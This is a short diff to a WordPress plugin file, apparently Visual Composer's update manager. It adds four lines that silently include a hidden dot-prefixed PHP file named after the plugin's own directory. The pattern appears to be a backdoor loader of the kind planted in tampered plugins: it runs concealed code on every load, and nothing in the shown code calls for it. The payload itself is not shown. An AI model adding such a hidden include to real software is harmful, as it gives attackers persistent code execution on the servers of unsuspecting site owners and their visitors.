@@ -6,6 +6,10 @@ if ( ! defined( 'ABSPATH' ) ) {
 /**
  * Manage update messages and Plugins info for VC in default WordPress plugins list.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Vc_Updating_Manager {
 	/**
 	 * The plugin current version
